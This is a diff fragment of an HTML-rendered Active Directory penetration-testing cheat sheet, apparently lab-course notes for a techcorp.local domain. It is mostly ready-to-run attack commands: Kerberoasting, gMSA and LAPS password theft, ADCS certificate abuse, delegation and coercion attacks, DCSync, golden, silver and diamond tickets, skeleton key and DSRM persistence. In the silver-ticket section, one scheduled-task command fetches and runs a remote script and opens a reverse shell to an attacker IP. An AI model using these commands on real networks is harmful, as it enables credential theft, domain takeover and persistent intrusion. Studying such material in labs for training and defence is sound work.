+<span class="hljs-comment"># Find machines where a given user is member of specific group</span>
+Get-DomainGPOUserLocalGroupMapping -Identity studentuser41
+
+<span class="hljs-comment"># Get users which are in a local group of a machine in any OU using GPO</span>
+(Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase <span class="hljs-variable">$_</span>} | Get-DomainGPOComputerLocalGroupMapping
+
+<span class="hljs-comment"># Get users which are in a local group of a machine in a particular OU using GPO</span>
+(Get-DomainOU -Identity <span class="hljs-string">'OU=Mgmt,DC=us,DC=techcorp,DC=local'</span>).distinguishedname | %{Get-DomainComputer -SearchBase <span class="hljs-variable">$_</span>} | Get-DomainGPOComputerLocalGroupMapping
+
+<span class="hljs-comment">## Domain Enumeration - OU </span>
+
+<span class="hljs-comment"># Enumerate OU (associated GPO ID is present in GPLINK attribute)</span>
+Get-DomainOU | select displayname, gplink
+
+<span class="hljs-comment"># Find GPO applied to given OU by doing lookup of GPO ID identified in previous step</span>
+Get-DomainGPO -Identity <span class="hljs-string">'{FCE16496-C744-4E46-AC89-2D01D76EAD68}'</span>
+
+<span class="hljs-comment"># Find users which are in local group of computers across all OUs</span>
+(Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase <span class="hljs-variable">$_</span> } | Get-DomainGPOComputerLocalGroupMapping
+
+(Get-DomainOU -Identity <span class="hljs-string">'OU=Mgmt,DC=us,DC=techcorp,DC=local'</span>).distinguishedname | %{Get-DomainComputer -SearchBase <span class="hljs-variable">$_</span> } | Get-DomainGPOComputerLocalGroupMapping
+
+</code></pre>
+<h4 class="code-line" data-line-start=387 data-line-end=388 ><a id="Domain_ACL_Enumeration_387"></a>Domain ACL Enumeration</h4>
+<pre><code class="has-line-data" data-line-start="390" data-line-end="411" class="language-powershell"><span class="hljs-comment"># Find ACL associated with any given object</span>
+Get-DomainObjectAcl -Identity Student41
+Get-DomainObjectAcl -Identity Student41 -ResolveGUIDs | select -First <span class="hljs-number">1</span>
+
+<span class="hljs-comment"># Find ACL accositaed with given LDAP Path</span>
+Get-DomainObjectAcl -Searchbase <span class="hljs-string">"LDAP://CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local"</span> -ResolveGUIDs
+
+<span class="hljs-comment"># Find Intresting Domain ACL</span>
+Find-InterestingDomainAcl -ResolveGUIDs | select -First <span class="hljs-number">1</span>
+Find-InterestingDomainAcl -ResolveGUIDs | ?{<span class="hljs-variable">$_</span>.IdentityReferenceName <span class="hljs-operator">-match</span> <span class="hljs-string">"studentuserx"</span>}
+
+<span class="hljs-comment"># Find ACL Associated with PATH</span>
+Get-PathAcl -Path <span class="hljs-string">"\\us-dc\sysvol"</span>
+
+<span class="hljs-comment"># Enumerate permissions for group</span>
+Invoke-ACLScanner -ResolveGUIDS | <span class="hljs-built_in">Where-Object</span> {<span class="hljs-variable">$_</span>.IdentityReference <span class="hljs-operator">-match</span> “&lt;groupname&gt;”}
+Invoke-ACLScanner -ResolveGUIDS | <span class="hljs-built_in">Where-Object</span> {<span class="hljs-variable">$_</span>.IdentityReference <span class="hljs-operator">-match</span> “&lt;groupname&gt;”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
+
+Reference:
+https://github.com/cyberark/ACLight
+</code></pre>
+<h4 class="code-line" data-line-start=412 data-line-end=413 ><a id="Domain_Trust_Enumeration_412"></a>Domain Trust Enumeration</h4>
+<pre><code class="has-line-data" data-line-start="415" data-line-end="429" class="language-powershell"><span class="hljs-comment"># Enumerate the trust for current domain</span>
+Get-DomainTrust
+Get-DomainTrust -Domain Techcorp.local
+
+<span class="hljs-comment"># Enumerate Forest Level details</span>
+Get-Forest
+Get-ForestDomain
+Get-ForestGlobalCatalog
+Get-ForestTrust
+
+<span class="hljs-comment"># Trust Enumeration using AD Module</span>
+(Get-ADForest).Domains
+Get-ADTrust -Filter *
+</code></pre>
+<h4 class="code-line" data-line-start=430 data-line-end=431 ><a id="Domain_User_Hunting_430"></a>Domain User Hunting</h4>
+<pre><code class="has-line-data" data-line-start="433" data-line-end="449" class="language-powershell"><span class="hljs-comment">## Domain Enumeration - User Hunting</span>
+
+<span class="hljs-comment"># Find the local admin access across all the computers</span>
+Find-localAdminAccess
+
+<span class="hljs-comment"># Use WMI and PSRemoting for remote system access</span>
+Find-WMILocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess.ps1
+
+<span class="hljs-comment"># Find the active session of Domain User/Group </span>
+Find-DomainUserLocation
+Find-DomainUserLocation -CheckAccess
+Find-DomainUserLocation -UserGroupIdentity <span class="hljs-string">"StudentUsers"</span>
+Find-DomainUserLocation -Stealth
+
+</code></pre>
+<h4 class="code-line" data-line-start=451 data-line-end=452 ><a id="BloodHound_451"></a>BloodHound</h4>
+<pre><code class="has-line-data" data-line-start="454" data-line-end="471" class="language-powershell"><span class="hljs-comment"># Run sharphound collector </span>
+cd C:\AD\Tools\BloodHound-master\Collectors
+SharpHound.exe --CollectionMethods All
+
+<span class="hljs-comment"># Use powershell based collector</span>
+. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1
+Invoke-BloodHound -CollectionMethods All
+
+<span class="hljs-comment">#Copy neo4j-community-3.5.1 to C:\</span>
+<span class="hljs-comment">#Open cmd</span>
+cd C:\neo4j\neo4j-community-<span class="hljs-number">3.5</span>.<span class="hljs-number">1</span>-windows\bin
+neo4j.bat install-service
+neo4j.bat start
+<span class="hljs-comment">#Browse to BloodHound-win32-x64 </span>
+Run BloodHound.exe
+<span class="hljs-comment">#Change credentials and login</span>
+</code></pre>
+<h4 class="code-line" data-line-start=472 data-line-end=473 ><a id="Privilege_Escalation__Local_472"></a>Privilege Escalation - Local</h4>
+<pre><code class="has-line-data" data-line-start="475" data-line-end="499" class="language-powershell"><span class="hljs-comment">## Privilege Escalation</span>
+
+<span class="hljs-comment"># PrivEsc Tools</span>
+Invoke-PrivEsc (PrivEsc)
+winPEASx64.exe (PEASS-ng)
+
+<span class="hljs-comment"># PowerUp</span>
+. C:\AD\Tools\PowerUp.ps1
+Invoke-AllChecks
+Get-SericeUnquoted -Verbose
+Get-ModifiableServiceFile -Verbose
+Get-ModifiableService -Verbose
+
+Invoke-ServiceAbuse -Name <span class="hljs-string">"ALG"</span> 
+Invoke-ServiceAbuse -Name ALG -UserName us\studentuserx -Verbose
+Invoke-ServiceAbuse -Name <span class="hljs-string">"ALG"</span> -Command <span class="hljs-string">"net localgroup Administrators studentuser41 /add"</span>
+Write-ServiceBinary -Name <span class="hljs-string">'VulnerableSvc'</span> -Command <span class="hljs-string">'c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update'</span> -Path <span class="hljs-string">'C:\Program Files\VulnerableSvc'</span>
+
+net localgroup Administrators
+
+net.exe stop VulnerableSvc
+net.exe start VulnerableSvc
+
+</code></pre>
+<h4 class="code-line" data-line-start=500 data-line-end=501 ><a id="Privilege_Escalation__Domain_500"></a>Privilege Escalation - Domain</h4>
+<pre><code class="has-line-data" data-line-start="503" data-line-end="537" class="language-powershell">
+&gt;&gt; Privilege Escalation - Kerberosting
+
+<span class="hljs-comment"># Keberoasting</span>
+Get-DomainUser -SPN | select cn, serviceprincipalname
+.\Rubeus.exe kerberoast /stats
+.\Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec /outfile:hashes.txt
+
+<span class="hljs-comment"># Targeted Kerberosting</span>
+Set-DomainObject -Identity support1user -Set @{serviceprincipalname=<span class="hljs-string">'us/myspn'</span>}
+
+<span class="hljs-comment"># Cracking the password</span>
+C:\AD\Tools\john-<span class="hljs-number">1.9</span>.<span class="hljs-number">0</span>-jumbo-<span class="hljs-number">1</span>-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\<span class="hljs-number">10</span>k-worst-pass.txt C:\AD\Tools\hashes.txt
+
+&gt;&gt; Privilege Escalation - gMSA
+
+- Step <span class="hljs-number">1</span>. Identify the gMSA account by filtering ObjectClass 
+Get-DomainObject -LDAPFilter <span class="hljs-string">'(objectClass=msDS-GroupManagedServiceAccount)'</span>
+
+- Step <span class="hljs-number">2</span>. Identify pricipal having access to the gMSA account via ADModule
+Get-ADServiceAccount -Filter * -Properties name, ObjectClass
+Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
+
+- Step <span class="hljs-number">3</span>. Fetch the Password Blob
+<span class="hljs-variable">$Passwordblob</span> = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).<span class="hljs-string">'msDS-ManagedPassword'</span>
+
+- Step <span class="hljs-number">4</span>. Convert the password blob to NTLM hash
+Import-Module C:\AD\Tools\DSInternals_v4.<span class="hljs-number">7</span>\DSInternals\DSInternals.psd1
+<span class="hljs-variable">$decodedpwd</span> = ConvertFrom-ADManagedPasswordBlob <span class="hljs-variable">$Passwordblob</span>
+ConvertTo-NTHash -Password <span class="hljs-variable">$decodedpwd</span>.SecureCurrentPassword
+
+- Step <span class="hljs-number">5</span>. Use the passwd hash
+C:\AD\Tools\SafetyKatz.exe <span class="hljs-string">"sekurlsa::opassth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c684cc0fa1744195edd1aec43078 /run:cmd.exe"</span> <span class="hljs-string">"exit"</span>
+</code></pre>
+<h4 class="code-line" data-line-start=539 data-line-end=540 ><a id="Local_Administrator_Password_Solution_LAPS_539"></a>Local Administrator Password Solution (LAPS)</h4>
+<pre><code class="has-line-data" data-line-start="542" data-line-end="577" class="language-powershell">
+<span class="hljs-comment"># Check for presence of AdmPwd.dll at below location on the Machine locally</span>
+ls <span class="hljs-string">'C:\Program Files\LAPS\CSE\AdmPwd.dll'</span>
+
+<span class="hljs-comment"># Check existance of LAPS in domain</span>
+Get-AdObject <span class="hljs-string">'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=&lt;DOMAIN&gt;,DC=&lt;DOMAIN&gt;'</span>
+Get-DomainComputer | <span class="hljs-built_in">Where-object</span> -property ms-Mcs-AdmPwdExpirationTime | <span class="hljs-built_in">select-object</span> samaccountname
+Get-DomainGPO -Identity *LAPS*
+
+<span class="hljs-comment"># Check to which computers the LAPS GPO is applied to</span>
+Get-DomainOU -GPLink <span class="hljs-string">"Distinguishedname from GET-DOMAINGPO -Identity *LAPS*"</span> | select name, distinguishedname
+Get-DomainComputer -Searchbase <span class="hljs-string">"LDAP://&lt;distinguishedname&gt;"</span> -Properties Distinguishedname
+
+<span class="hljs-comment"># Parse the GPO policy file for LAPS (https://github.com/PowerShell/GPRegistryPolicy))</span>
+Parse-PolFile <span class="hljs-string">"&lt;GPCFILESYSPATH FROM GET-DOMAINGPO&gt;\Machine\Registry.pol"</span> | select ValueName, ValueData
+
+<span class="hljs-comment"># Fetch the password for given system, if current user has Read/GenericAll access</span>
+Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd
+Get-DomainComputer -Identity us-mailmgmt | select name,ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+
+<span class="hljs-comment"># Find users who can read the LAPS password of machine in OU</span>
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | <span class="hljs-built_in">Where-Object</span> { (<span class="hljs-variable">$_</span>.ObjectAceType <span class="hljs-operator">-like</span> <span class="hljs-string">'ms-Mcs-AdmPwd'</span>) -and (<span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">'ReadProperty'</span>)}
+
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | <span class="hljs-built_in">Where-Object</span> { (<span class="hljs-variable">$_</span>.ObjectAceType <span class="hljs-operator">-like</span> <span class="hljs-string">'ms-Mcs-AdmPwd'</span>) -and (<span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">'ReadProperty'</span>)} | <span class="hljs-built_in">ForEach-Object</span> {<span class="hljs-variable">$_</span> | <span class="hljs-built_in">Add-Member</span> NoteProperty <span class="hljs-string">'IdentityName'</span> $(Convert-SidToName <span class="hljs-variable">$_</span>.SecurityIdentifier);<span class="hljs-variable">$_</span>}
+
+<span class="hljs-comment"># Using AD module</span>
+. .\Get-lapsPermissions.ps1
+Get-AdmPwdPassword -ComputerName US-MAILMGMT
+
+<span class="hljs-comment"># Using LAPS Module</span>
+Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
+Find-AdmPwdExtendedRights -Identity OUDistinguishedName
+Get-AdmPwdPassword -ComputerName US-MAILMGMT
+
+</code></pre>
+<h4 class="code-line" data-line-start=579 data-line-end=580 ><a id="Active_Directory_Certificate_Services_ADCS_579"></a>Active Directory Certificate Services (ADCS)</h4>
+<pre><code class="has-line-data" data-line-start="582" data-line-end="647" class="language-powershell">
+<span class="hljs-comment"># Conditions of vulnerable certificate template which can be abused</span>
+- CA grants normal/low privileged users enrollment rights
+- Manager approval is disabled
+- Authorization signatures are not required
+- target template grants normal/low privileged users enrollment rights
+
+
+&gt;&gt; Enumerating - Active Directory certificate Service (ADCS) 
+
+<span class="hljs-comment"># Identify the ADCS service installation</span>
+Certify.exe cas
+
+<span class="hljs-comment"># Enumerate the templates configured</span>
+Certify.exe find
+
+<span class="hljs-comment"># Enumerate the vulnerable templates</span>
+Certify.exe find /vulnerable
+
+<span class="hljs-comment"># If the enrolleeSuppliesSubject is not not allowed for all domain users, it wont show up in vulnerable template and needs to enumerated seperately (ESC1)</span>
+Certify.exe find /enrolleeSuppliesSubject
+
+
+&gt;&gt; Persistance (THEFT-<span class="hljs-number">4</span>): Extracting User and Machine certificates
+
+<span class="hljs-comment"># List all certificates for local machine in certificate store</span>
+ls cert:\LocalMachine\My
+
+<span class="hljs-comment"># Export the certificate in PFX format</span>
+ls cert:\LocalMachine\My\<span class="hljs-number">89</span>C1171F6810A6725A47DB8D572537D736D4FF17 | Export-PfxCertificate -FilePath C:\Users\Public\pawadmin.pfx -Password (<span class="hljs-built_in">ConvertTo-SecureString</span> -String <span class="hljs-string">'niks'</span> -Force -AsPlainText)
+
+<span class="hljs-comment"># Use Mimikatz to export certificate in pfx format (default cert pass is mimikatz)</span>
+Invoke-mimikatz -Command <span class="hljs-string">"crypto::certificates /export"</span>
+Invoke-mimikatz -Command <span class="hljs-string">"!crypto::certificates /systemstore:local_machine /export"</span>
+cat cert.pfx | base64 -w <span class="hljs-number">0</span>
+C:\AD\Tools\Rubeus.exe asktgt /user:nlamb /certificate:MNeg[...]IH0A== /password:mimikatz /nowrap /ptt
+
+
+
+&gt;&gt; Escalation (ESC-<span class="hljs-number">1</span>) : Domain User to Domain Admin and Enterprise Admin 
+
+CASE I: Domain Admin
+
+<span class="hljs-comment"># Request certificate for DA user using ESC1 technique, and save it as cert.pem</span>
+Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
+
+<span class="hljs-comment"># Convert cert.pem to cert.pfx format</span>
+C:\AD\Tools\openssl\openssl.exe pkcs12 <span class="hljs-operator">-in</span> C:\AD\Tools\cert.pem -keyex -CSP <span class="hljs-string">"Microsoft Enhanced Cryptographic Provider v1.0"</span> -export -out C:\AD\Tools\DA.pfx
+
+<span class="hljs-comment"># Request TGT using pfx cerificate and inject into memory</span>
+Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:niks /nowrap /ptt
+
+CASE II: Enterprise Admin
+
+<span class="hljs-comment"># Request certificate for EA user using ESC1 technique</span>
+Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
+
+<span class="hljs-comment"># Convert cert.pem to cert.pfx format</span>
+C:\AD\Tools\openssl\openssl.exe pkcs12 <span class="hljs-operator">-in</span> C:\AD\Tools\cert.pem -keyex -CSP <span class="hljs-string">"Microsoft Enhanced Cryptographic Provider v1.0"</span> -export -out C:\AD\Tools\EA.pfx
+
+<span class="hljs-comment"># Request TGT using pfx cerificate and inject into memory</span>
+Rubeus.exe asktgt /user:techcorp.local\Administrator
+/dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:niks /nowrap /ptt
+
+</code></pre>
+<h4 class="code-line" data-line-start=649 data-line-end=650 ><a id="Kerberos_Delegation_649"></a>Kerberos Delegation</h4>
+<pre><code class="has-line-data" data-line-start="652" data-line-end="739" class="language-powershell">
+&gt;&gt; Unconstrained Delegation
+
+<span class="hljs-comment"># Step 1. Identify Computer Account with Unconstrained Delegation</span>
+Get-DomainComputer -Unconstrained | select samaccountname
+
+<span class="hljs-comment"># Step 2. Use PrintSpool attack to force DC$ machine account running print spooler service to authenticate with our Web server having unconstrained delegation enabled. </span>
+.\MS-RPRN.exe \\us-dc.techcorp.local \\us-web.us.techcorp.local
+.\Petitpotam.exe us-web us-dc
+
+<span class="hljs-comment"># Step 3. Login to unconstrained server and execute Rubeus to monitor for ticket</span>
+.\Rubeus.exe monitor /nowrap /targetuser:US-DC$ /interval:<span class="hljs-number">5</span>
+
+<span class="hljs-comment"># Step 4. Use the Base64 encoded TGT </span>
+.\Rubeus.exe ptt /ticket:abcd==
+
+NOTE: Above injected ticket cannot be used directly <span class="hljs-keyword">for</span> code execution but DCSync will work
+
+<span class="hljs-comment"># Step 5. DCsync </span>
+. .\Invoke-Mimi.ps1
+Invoke-Mimi -Command <span class="hljs-string">'"lsadump::dcsync /user:us\krbtgt"'</span>
+Invoke-Mimi -Command <span class="hljs-string">'"lsadump::dcsync /user:us\Administrator"'</span>
+C:\AD\Tools\SharpKatz.exe --Command dcsync --User techcorp\administrator --Domain techcorp.local --DomainController techcorp-dc.techcorp.local
+
+
+&gt;&gt; Constrained Delegation
+
+- Kerberos Only delegation
+- Protocol Transition <span class="hljs-keyword">for</span> non kerberos service
+
+<span class="hljs-comment"># Step 1. Identify a Computer or User account having constrained delegation enabled</span>
+Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
+Get-DomainComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
+
+<span class="hljs-comment"># Steo 2. Request TGS for Alternate service using the session of affected user</span>
+.\Rubeus.exe s4u /user:appsvc /rc4:<span class="hljs-number">1</span>d49d390ac01d568f0ee9be82bb74d4c /impersonateuser:Administrator /msdsspn:<span class="hljs-string">"CIFS/us-mssql"</span> /altservice:HTTP /domain:us.techcorp.local /ptt
+
+<span class="hljs-comment"># Step 3. Access the service</span>
+winrs -r:us-mssql cmd
+
+NOTE: Use the same name <span class="hljs-keyword">for</span> remote connection as specified <span class="hljs-keyword">in</span> msdsspn attribute
+
+
+
+&gt;&gt; Resource Based Constrained Delegation (RBCD) attack
+
+- Requires admin rights on one of domian joined system or ablility to join our computer to domain
+- Write permission on Target System to set msDS-AllowedToActOnBehalfOfOtherIdentity attribute
+
+
+CASE I: Using existing Computer <span class="hljs-keyword">for</span> RBCD attack
+
+STEP <span class="hljs-number">1</span>. Identify the Computer(us-helpdesk) where our principal (mgmtadmin) has GenericAll/Write access 
+
+ps&gt; Find-InterestingDomainAcl | ?{<span class="hljs-variable">$_</span>.identityreferencename <span class="hljs-operator">-match</span> <span class="hljs-string">'mgmtadmin'</span>}
+
+ps&gt; Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">"WriteProperty|GenericWrite|GenericAll|WriteDacl"</span> -and <span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-match</span> <span class="hljs-string">"S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}"</span> }
+
+STEP <span class="hljs-number">2</span>. Set the delegation attribute to a Computer Account where we have local admin access (student41$)
+
+<span class="hljs-comment"># Find the SID of Computer Account (student41)</span>
+ps&gt; Get-DomainComputer -Identity student41 -Properties objectSid
+
+<span class="hljs-comment"># Login as mgmtadmin user, and Set the delegation attribute to Computer Account (us-helpdesk)</span>
+ps&gt; <span class="hljs-variable">$rsd</span> = <span class="hljs-built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="hljs-string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-210670787-2521448726-163245708-16151)"</span>; <span class="hljs-variable">$rsdb</span> = <span class="hljs-built_in">New-Object</span> byte[] (<span class="hljs-variable">$rsd</span>.BinaryLength); <span class="hljs-variable">$rsd</span>.GetBinaryForm(<span class="hljs-variable">$rsdb</span>, <span class="hljs-number">0</span>); Get-DomainComputer -Identity <span class="hljs-string">"us-helpdesk"</span> | Set-DomainObject -Set @{<span class="hljs-string">'msDS-AllowedToActOnBehalfOfOtherIdentity'</span> = <span class="hljs-variable">$rsdb</span>} -Verbose
+
+STEP <span class="hljs-number">3</span>. Perform PTH using student41$ computer account
+
+ps&gt; Rubeus.exe s4u /user:student41$ /rc4:b62c7c107072398d7c81a2639e986b97 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
+
+STEP <span class="hljs-number">4</span>. Access the system as admin
+winrs -r:us-helpdesk cmd.exe
+
+
+CASE II. Creating fake computer account <span class="hljs-keyword">for</span> RBCD attack
+
+- Every domain user can add machines to Ad based ms-DS-MachineAccountQuota which is set to <span class="hljs-number">10</span>, which will allow us to create fake computer object with known password and add it to domain
+- Write Permission on Target System to set msDS-AllowedToActOnBehalfOfOtherIdentity
+
+STEP <span class="hljs-number">1</span>. Create a new Machine Account user PowerMad.ps1 script
+ps&gt; . C:\AD\Tools\Powermad.ps1
+ps&gt; New-MachineAccount -MachineAccount studentcompX
+
+STEP <span class="hljs-number">2</span>. Use above Computer account (created by powermad) instead of student41$ machine account, and rest of the steps stay the same.
+
+
+</code></pre>
+<h2 class="code-line" data-line-start=741 data-line-end=742 ><a id="Kerberos_Attacks_741"></a>Kerberos Attacks</h2>
+<h4 class="code-line" data-line-start=743 data-line-end=744 ><a id="Golden_Ticket_743"></a>Golden Ticket</h4>
+<pre><code class="has-line-data" data-line-start="746" data-line-end="769" class="language-powershell"><span class="hljs-comment"># Persistance technique for creating fake TGT ticket using KDC account hash (krbtgt)</span>
+
+<span class="hljs-comment"># Get Domain Detals</span>
+Get-Domain | select name
+us.techcorp.local
+
+Get-DomainSID
+S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">210670787</span>-<span class="hljs-number">2521448726</span>-<span class="hljs-number">163245708</span>
+
+<span class="hljs-comment"># Fetch krbtgt ntlm and aes hash</span>
+Invoke-Mimi -Command <span class="hljs-string">'"lsadump::dcsync /user:krbtgt"'</span>
+
+<span class="hljs-comment"># Use above details to create a golden ticket impersonating Administrator user</span>
+Invoke-Mimi -Command <span class="hljs-string">'"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span>
+
+Invoke-Mimikatz -Command <span class="hljs-string">'"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden_tkt.kirbi"'</span>
+
+C:\AD\Tools\BetterSafetyKatz.exe <span class="hljs-string">"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span> <span class="hljs-string">"exit"</span>
+
+<span class="hljs-comment"># Use Golden Ticket to gain RCE on DC</span>
+klist
+Enter-PSSession -ComputerName us-dc
+</code></pre>
+<h4 class="code-line" data-line-start=770 data-line-end=771 ><a id="Silver_Ticket_770"></a>Silver Ticket</h4>
+<pre><code class="has-line-data" data-line-start="773" data-line-end="800" class="language-powershell"><span class="hljs-comment"># Comman Attack Scenario, if you have TGT of machine account...Then Silver Ticket can b ecrafted to one of the services as CIFS, HOST, HTTP etc and gain RCE on the system</span>
+
+<span class="hljs-comment"># Fetch the NTLM hash of the machine account US-DC$</span>
+Invoke-Mimi -Command <span class="hljs-string">'"lsadump::dcsync /user:us\US-DC$"'</span>
+f4492105cb24a843356945e45402073e
+
+<span class="hljs-comment"># Craft a silver ticket for CIFS service on DC using DC$ machine account NTLM hash</span>
+Invoke-Mimi -Command <span class="hljs-string">'"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:CIFS /rc4:f4492105cb24a843356945e45402073e /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span>
+
+C:\AD\Tools\BetterSafetyKatz.exe <span class="hljs-string">"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:CIFS /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span> <span class="hljs-string">"exit"</span>
+
+ls \\us-dc.us.techcorp.local\c$
+
+<span class="hljs-comment"># Craft HOST service ticket</span>
+Invoke-Mimi -Command <span class="hljs-string">'"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:HOST /rc4:f4492105cb24a843356945e45402073e /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span>
+
+<span class="hljs-comment"># Use Scheduled task to get RCE on DC via HOST Service</span>
+schtasks /create /S us-dc.us.techcorp.local /SC Weekly /RU <span class="hljs-string">"NT Authority\SYSTEM"</span> /TN <span class="hljs-string">"STCheck41"</span> /TR <span class="hljs-string">"powershell.exe -c 'iex (iwr http://192.168.100.41:8080/dakiya.ps1  -UseBasicParsing); reverse -Reverse -IPAddress 192.168.100.41 -Port 8081'"</span>
+
+.\nc64.exe -lvp <span class="hljs-number">8081</span>
+powercat -l -v -p <span class="hljs-number">443</span> -t <span class="hljs-number">1000</span>
+
+schtasks /Run /S us-dc.us.techcorp.local /TN <span class="hljs-string">"STCheck41"</span>
+
+NOTE: HOST - Scheduled Task | HOST + RPCSS - PowerShell remoting &amp; WMI | LDAP - DCSync | WSMAN | CIFS
+
+</code></pre>
+<h4 class="code-line" data-line-start=801 data-line-end=802 ><a id="Diamond_Ticket_801"></a>Diamond Ticket</h4>
+<pre><code class="has-line-data" data-line-start="804" data-line-end="821" class="language-powershell"><span class="hljs-comment"># Instead of creating completely forged ticket, it fetches valid TGT and modifies required attributes </span>
+
+<span class="hljs-comment"># Request TGT for StudentUserX and modify the parameters to create a diamond ticket</span>
+Rubeus.exe diamond
+/krbkey:<span class="hljs-number">5</span>e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
+/user:studentuserx /password:studentuserxpassword /enctype:aes
+/ticketuser:administrator /domain:us.techcorp.local /dc:US-DC.us.techcorp.local
+/ticketuserid:<span class="hljs-number">500</span> /groups:<span class="hljs-number">512</span> /createnetonly:C:\Windows\System32\cmd.exe /show
+/ptt
+
+<span class="hljs-comment"># Use /tgtdeleg if we have access as domain user and its TGT is already cached</span>
+Rubeus.exe diamond
+/krbkey:<span class="hljs-number">5</span>e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
+/tgtdeleg /enctype:aes /ticketuser:administrator /domain:us.techcorp.local
+/dc:US-DC.us.techcorp.local /ticketuserid:<span class="hljs-number">500</span> /groups:<span class="hljs-number">512</span>
+/createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+</code></pre>
+<h4 class="code-line" data-line-start=823 data-line-end=824 ><a id="Skeleton_Key_823"></a>Skeleton Key</h4>
+<pre><code class="has-line-data" data-line-start="826" data-line-end="836" class="language-powershell"><span class="hljs-comment"># Once set, Allows any user to Login using 'mimikatz' as password for any useraccount</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"privilege::debug" "misc::skeleton"'</span> -ComputerName us-dc
+
+<span class="hljs-comment"># If lsass is running as protected process</span>
+mimikatz <span class="hljs-comment"># privilege::debug</span>
+mimikatz <span class="hljs-comment"># !+</span>
+mimikatz <span class="hljs-comment"># !processprotect /process:lsass.exe /remove</span>
+mimikatz <span class="hljs-comment"># misc::skeleton</span>
+mimikatz <span class="hljs-comment"># !-</span>
+</code></pre>
+<h4 class="code-line" data-line-start=837 data-line-end=838 ><a id="DSRM_Account_837"></a>DSRM Account</h4>
+<pre><code class="has-line-data" data-line-start="840" data-line-end="857" class="language-powershell"><span class="hljs-comment"># Directory Services Restore Mode (DSRM), is the local Administrator whose password is configured as SafeModePassword. it is stored in SAM file and not ntds.dat file </span>
+
+<span class="hljs-comment"># Dump the local account credentials from sam file (having local DSRM account) </span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"token::elevate" "lsadump::sam"'</span> -Computer us-dc
+
+<span class="hljs-comment"># Adminsitrator hash for DA stored in ntds.dat file can be fetched using below command</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::lsa /patch"'</span> -Computername us-dc
+
+<span class="hljs-comment"># Login is not allowed by DSRM Account, requires regitry changes</span>
+<span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-string">"HKLM:\System\CurrentControlSet\Control\Lsa"</span> -Name <span class="hljs-string">"DsrmAdminLogonBehaviour"</span> -Value <span class="hljs-number">2</span> -PropertyType DWORD
+
+<span class="hljs-comment"># Login using PTH</span>
